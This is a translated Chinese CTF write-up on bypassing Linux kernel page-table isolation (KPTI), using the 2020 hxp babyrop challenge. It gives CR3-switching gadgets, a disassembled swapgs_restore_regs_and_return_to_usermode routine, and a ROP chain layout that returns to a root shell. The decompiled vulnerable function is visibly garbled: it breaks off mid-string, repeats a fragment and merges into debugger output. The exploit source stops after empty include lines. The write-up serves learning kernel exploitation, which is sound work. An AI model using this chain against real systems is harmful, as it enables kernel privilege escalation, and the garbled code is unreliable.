# Linux Kernel KPTI保护绕过
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
> 最近做题遇到一种错误，当执行ROP返回用户态时会报一个段错误。后面了解到是因为内核开启了KPTI保护。于是本篇文章主要讲述针对这种保护的绕过方法。
## KPTI简介
在没有开启
`KPTI`保护的内核中，每当执行用户空间代码时，`Linux`会在其分页表中保留整个内核内存的映射，即用户地址空间和内核地址空间将使用同一个页全局目录表，并保护其访问。
`KPTI(Kernel page-table
isolation)`，即内核页表隔离。通过把进程页表按照用户空间和内核空间隔离成两块来防止内核页表泄露。可以在`-append`选项下添加`kpti=1`或`nopti`来启用或禁用它。
而在开启了 `KPTI`保护的内核里，用户态页表包含了用户空间，其只含有一个用于处理中断的`kernel mapping
PGD`。当用户空间访问内核时，会先陷入中断，进入处理中断的 `trampoline mapping`，该中断处理程序会建立一个正常的的`kernel
mapping`的映射。
而为了实现 `PGD`的切换，内核增加了一组宏用来在进程进行用户态、内核态切换时进行页表切换。一个进程的内核态`PGD(4k)`和用户态
`PGD(4K)`一起形成了一个`8K`的 `PGD`。当中断发生时，内核使用切换
`CR3`寄存器来实现从用户态地址空间切换到内核态的地址空间。`CR3`的 `bit47-bit11`为 `PGD`的物理地址，最低为
`bit12`用于进行 `PGD`切换；`bit12=0`为内核态`PGD`，`bit12=1`为用户态 `PGD`。
`CR3`的 `bit0-bit11`为 `asid(Address Space Identifier)`，`asid`也分为 内核态和用户态，最高位
`bit11`来进行 `asid`切换；`bit11=0`为内核态 `asid`，`bit11=1`为用户态 `asid`。
那么一旦开启了 `KPTI`,由于内核态和用户态的页表不同，所以如果使用 `ret2user`或内核执行
`ROP`返回用户态时，由于内核态无法确定用户态的页表，所以会报出一个段错误。
## KPTI绕过
了解了 `KPTI`的特性之后，这里主要有2种思路来进行绕过。
###  swap CR3
在一个开启 `KPTI`内核中会调用 `SWITCH_KERNEL_CR3_NO_STACK`函数来从用户态进入内核态，关键代码如下所示：
    mov     rdi, cr3
    nop
    nop
    nop
    nop
    nop
    and     rdi, 0xFFFFFFFFFFFFE7FF
    mov     cr3, rdi
该代码就是将 `CR3`的 第12位与第13位清零。而页表的第12位在 `CR4`寄存器的 `PCIDE`位开启的情况下，都是保留给
`OS`使用，这里只关心 `13`位置零即可，也就相当于将 `CR3-0x1000`。
而在从内核态返回用户态时会调用 `SWITCH_USER_CR3`宏来切换 `CR3`，如下所示：
    mov     rdi, cr3
    or      rdi, 1000h
    mov     cr3, rdi
所以，这里第一种方法就很类似绕过 `smep`的方法，即利用内核中已有 `gadget`来在返回用户态执行 `iretq/sysret`之前 设置
`cr3`。寻找 到 能够将 `cr3`寄存器 与 `0x1000`执行 或运算即可。
###  swapgs_restore_regs_and_return_to_usermode
第二种方法即直接利用 `swapgs_restore_regs_and_return_to_usermode`这个函数内的
`gadget`。其汇编代码如下：
    swapgs_restore_regs_and_return_to_usermode
    .text:FFFFFFFF81600A34 41 5F                          pop     r15
    .text:FFFFFFFF81600A36 41 5E                          pop     r14
    .text:FFFFFFFF81600A38 41 5D                          pop     r13
    .text:FFFFFFFF81600A3A 41 5C                          pop     r12
    .text:FFFFFFFF81600A3C 5D                             pop     rbp
    .text:FFFFFFFF81600A3D 5B                             pop     rbx
    .text:FFFFFFFF81600A3E 41 5B                          pop     r11
    .text:FFFFFFFF81600A40 41 5A                          pop     r10
    .text:FFFFFFFF81600A42 41 59                          pop     r9
    .text:FFFFFFFF81600A44 41 58                          pop     r8
    .text:FFFFFFFF81600A46 58                             pop     rax
    .text:FFFFFFFF81600A47 59                             pop     rcx
    .text:FFFFFFFF81600A48 5A                             pop     rdx
    .text:FFFFFFFF81600A49 5E                             pop     rsi
    .text:FFFFFFFF81600A4A 48 89 E7                       mov     rdi, rsp    
    .text:FFFFFFFF81600A4D 65 48 8B 24 25+                mov     rsp, gs: 0x5004//从此处开始执行
    .text:FFFFFFFF81600A56 FF 77 30                       push    qword ptr [rdi+30h]
    .text:FFFFFFFF81600A59 FF 77 28                       push    qword ptr [rdi+28h]
    .text:FFFFFFFF81600A5C FF 77 20                       push    qword ptr [rdi+20h]
    .text:FFFFFFFF81600A5F FF 77 18                       push    qword ptr [rdi+18h]
    .text:FFFFFFFF81600A62 FF 77 10                       push    qword ptr [rdi+10h]
    .text:FFFFFFFF81600A65 FF 37                          push    qword ptr [rdi]
    .text:FFFFFFFF81600A67 50                             push    rax
    .text:FFFFFFFF81600A68 EB 43                          nop
    .text:FFFFFFFF81600A6A 0F 20 DF                       mov     rdi, cr3
    .text:FFFFFFFF81600A6D EB 34                          jmp     0xFFFFFFFF81600AA3
    .text:FFFFFFFF81600AA3 48 81 CF 00 10+                or      rdi, 1000h
    .text:FFFFFFFF81600AAA 0F 22 DF                       mov     cr3, rdi
    .text:FFFFFFFF81600AAD 58                             pop     rax
    .text:FFFFFFFF81600AAE 5F                             pop     rdi
    .text:FFFFFFFF81600AAF FF 15 23 65 62+                call    cs: SWAPGS
    .text:FFFFFFFF81600AB5 FF 25 15 65 62+                jmp     cs: INTERRUPT_RETURN
    _SWAPGS
    .text:FFFFFFFF8103EFC0 55                             push    rbp
    .text:FFFFFFFF8103EFC1 48 89 E5                       mov     rbp, rsp
    .text:FFFFFFFF8103EFC4 0F 01 F8                       swapgs
    .text:FFFFFFFF8103EFC7 5D                             pop     rbp
    .text:FFFFFFFF8103EFC8 C3                             retn
    _INTERRUPT_RETURN
    .text:FFFFFFFF81600AE0 F6 44 24 20 04                 test    byte ptr [rsp+0x20], 4
    .text:FFFFFFFF81600AE5 75 02                          jnz     native_irq_return_ldt
    .text:FFFFFFFF81600AE7 48 CF                          iretq
只需要从上述 `mov rsp, gs: 0x5004`代码处开始执行，就会依次执行 绕过 `kpti`和
`iretq/sysret`两种功能，自动返回用户态。
## 2020-hxp-babyrop
###  漏洞分析
    ssize_t __fastcall hackme_write(file *f, const char *data, size_t size, loff_t *off)
    {
      unsigned __int64 v4; // rdx
      ssize_t v5; // rbx
      int tmp[32]; // [rsp+0h] [rbp-A0h] BYREF
      unsigned __int64 v8; // [rsp+80h] [rbp-20h]
      _fentry__(f, data);
      v5 = v4;
      v8 = __readgsqword(0x28u);
      if ( v4 > 0x1000 )
      {
        _warn_printk("Buffer overflow detected (%d  0x1000 )
      {
        _warn_printk("Buffer overflow detected (%d  x/28i 0xffffffffb9800f10
       0xffffffffb9800f10:  pop    r15
       0xffffffffb9800f12:  pop    r14
       0xffffffffb9800f14:  pop    r13
       0xffffffffb9800f16:  pop    r12
       0xffffffffb9800f18:  pop    rbp
       0xffffffffb9800f19:  pop    rbx
       0xffffffffb9800f1a:  pop    r11
       0xffffffffb9800f1c:  pop    r10
       0xffffffffb9800f1e:  pop    r9
       0xffffffffb9800f20:  pop    r8
       0xffffffffb9800f22:  pop    rax
       0xffffffffb9800f23:  pop    rcx
       0xffffffffb9800f24:  pop    rdx
       0xffffffffb9800f25:  pop    rsi
       0xffffffffb9800f26:  mov    rdi,rsp                    
       0xffffffffb9800f29:  mov    rsp,QWORD PTR gs:0x6004//从此处开始利用
       0xffffffffb9800f32:  push   QWORD PTR [rdi+0x30]
       0xffffffffb9800f35:  push   QWORD PTR [rdi+0x28]
       0xffffffffb9800f38:  push   QWORD PTR [rdi+0x20]
       0xffffffffb9800f3b:  push   QWORD PTR [rdi+0x18]
       0xffffffffb9800f3e:  push   QWORD PTR [rdi+0x10]
       0xffffffffb9800f41:  push   QWORD PTR [rdi]
       0xffffffffb9800f43:  push   rax
       0xffffffffb9800f44:  xchg   ax,ax
       0xffffffffb9800f46:  mov    rdi,cr3
       0xffffffffb9800f49:  jmp    0xffffffffb9800f7f
       0xffffffffb9800f4b:  mov    rax,rdi
       0xffffffffb9800f4e:  and    rdi,0x7ff
所以后续的 `ROP`布置如下：
    swapgs_restore_regs_and_return_to_usermode+0x19,
    0,
    0,
    &get_shell,
    user_cs,
    user_rflags,
    user_sp,
    user_ss
最终的 `EXP`如下：
    // gcc -static -pthread exp.c -g -o exp
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 